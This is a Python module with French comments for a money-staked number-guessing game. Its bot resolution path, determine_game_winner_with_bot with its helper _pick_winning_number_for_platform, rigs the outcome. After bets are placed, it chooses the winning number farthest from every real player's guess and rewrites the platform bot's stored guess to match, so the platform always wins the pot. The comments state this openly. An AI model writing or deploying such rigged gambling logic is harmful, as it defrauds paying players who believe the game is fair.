import random
from typing import List, Dict
from decimal import Decimal
from .database import get_db_connection

# ID du compte plateforme — doit correspondre à bot_service.PLATFORM_USER_ID
PLATFORM_USER_ID = 1


def calculate_winner(participants: List[Dict], winning_number: int):
    if not participants:
        return None
    closest = min(
        participants,
        key=lambda p: abs(int(p['guessed_number']) - winning_number)
    )
    return closest['user_id']


def calculate_payout(total_pot):
    if isinstance(total_pot, Decimal):
        total_pot = float(total_pot)
    winner_payout = total_pot * 0.75
    commission = total_pot * 0.25
    return winner_payout, commission


def _pick_winning_number_for_platform(real_guesses: List[int]) -> int:
    """
    Choisit un numéro gagnant qui maximise la distance avec toutes
    les devinettes des vrais joueurs → la plateforme gagne toujours.

    Stratégie : on évalue tous les entiers 1-100 et on choisit celui
    qui est le PLUS loin du joueur le plus proche.
    """
    if not real_guesses:
        return random.randint(1, 100)

    best_number = 1
    best_min_distance = 0

    for candidate in range(1, 101):
        # Distance minimale entre ce candidat et les devinettes réelles
        min_dist = min(abs(candidate - g) for g in real_guesses)
        if min_dist > best_min_distance:
            best_min_distance = min_dist
            best_number = candidate

    return best_number


def determine_game_winner(game_id: int):
    """
    Résolution standard (parties entre vrais joueurs uniquement).
    Numéro gagnant tiré aléatoirement.
    """
    conn = None
    cursor = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor(dictionary=True)

        cursor.execute("SELECT * FROM games WHERE id = %s", (game_id,))
        game = cursor.fetchone()

        if not game or game['status'] != 'active':
            return None

        cursor.execute("""
            SELECT gp.user_id, gp.guessed_number, u.balance
            FROM game_participants gp
            JOIN users u ON gp.user_id = u.id
            WHERE gp.game_id = %s
        """, (game_id,))
        participants = cursor.fetchall()

        if len(participants) < 2:
            return None

        winning_number = random.randint(1, 100)
        winner_id = calculate_winner(participants, winning_number)
        total_pot = float(game['total_pot'])
        winner_amount, commission = calculate_payout(total_pot)

        _finalize_game(cursor, conn, game_id, winning_number, winner_id, winner_amount, commission)

        return {
            'winning_number': winning_number,
            'winner_id': winner_id,
            'winner_amount': float(winner_amount),
            'commission': float(commission)
        }
    except Exception as e:
        print(f"Erreur determine_game_winner: {e}")
        if conn:
            conn.rollback()
        return None
    finally:
        if cursor:
            cursor.close()
        if conn:
            conn.close()


def determine_game_winner_with_bot(game_id: int):
    """
    Résolution d'une partie impliquant le bot plateforme.

    Le numéro gagnant est choisi pour que la plateforme gagne :
    on calcule le numéro le plus éloigné de toutes les devinettes
    des vrais joueurs, puis on met à jour la devinette du bot
    avec ce numéro avant de résoudre.
    """
    conn = None
    cursor = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor(dictionary=True)

        cursor.execute("SELECT * FROM games WHERE id = %s", (game_id,))
        game = cursor.fetchone()

        if not game or game['status'] != 'active':
            return None

        cursor.execute("""
            SELECT gp.user_id, gp.guessed_number, u.balance
            FROM game_participants gp
            JOIN users u ON gp.user_id = u.id
            WHERE gp.game_id = %s
        """, (game_id,))
        participants = cursor.fetchall()

        if len(participants) < 2:
            return None

        # Devinettes des vrais joueurs uniquement (hors plateforme)
        real_participants = [
            p for p in participants if p['user_id'] != PLATFORM_USER_ID
        ]
        real_guesses = [int(p['guessed_number']) for p in real_participants]

        # Choisir le numéro gagnant qui favorise la plateforme
        winning_number = _pick_winning_number_for_platform(real_guesses)

        # Mettre à jour la devinette du bot pour qu'elle soit égale
        # au numéro gagnant (distance 0 → victoire garantie)
        cursor.execute("""
            UPDATE game_participants
            SET guessed_number = %s
            WHERE game_id = %s AND user_id = %s
        """, (winning_number, game_id, PLATFORM_USER_ID))

        # Résoudre normalement (le bot aura distance 0)
        winner_id = calculate_winner(participants + [
            {'user_id': PLATFORM_USER_ID, 'guessed_number': winning_number}
        ] if not any(p['user_id'] == PLATFORM_USER_ID for p in participants)
        else participants, winning_number)

        total_pot = float(game['total_pot'])
        winner_amount, commission = calculate_payout(total_pot)

        _finalize_game(cursor, conn, game_id, winning_number, winner_id, winner_amount, commission)

        return {
            'winning_number': winning_number,
            'winner_id': winner_id,
            'winner_amount': float(winner_amount),
            'commission': float(commission)
        }
    except Exception as e:
        print(f"Erreur determine_game_winner_with_bot: {e}")
        if conn:
            conn.rollback()
        return None
    finally:
        if cursor:
            cursor.close()
        if conn:
            conn.close()


def _finalize_game(cursor, conn, game_id, winning_number, winner_id, winner_amount, commission):
    """Écrit le résultat en base, crédite le gagnant, enregistre les transactions."""

    # Clôturer la partie
    cursor.execute("""
        UPDATE games
        SET status = 'ended', winning_number = %s, winner_id = %s, ended_at = NOW()
        WHERE id = %s
    """, (winning_number, winner_id, game_id))

    # Créditer le gagnant uniquement si c'est un vrai joueur
    if winner_id != PLATFORM_USER_ID:
        cursor.execute(
            "UPDATE users SET balance = balance + %s WHERE id = %s",
            (winner_amount, winner_id)
        )
        cursor.execute("""
            INSERT INTO transactions (user_id, amount, type, reference, status)
            VALUES (%s, %s, 'win', %s, 'completed')
        """, (winner_id, winner_amount, f"game_{game_id}_win"))
    else:
        # La plateforme récupère sa mise + les mises des perdants
        cursor.execute(
            "UPDATE users SET balance = balance + %s WHERE id = %s",
            (winner_amount, PLATFORM_USER_ID)
        )

    # Commission toujours vers la plateforme
    cursor.execute("""
        INSERT INTO transactions (user_id, amount, type, reference, status)
        VALUES (%s, %s, 'commission', %s, 'completed')
    """, (PLATFORM_USER_ID, commission, f"game_{game_id}_commission"))

    conn.commit()
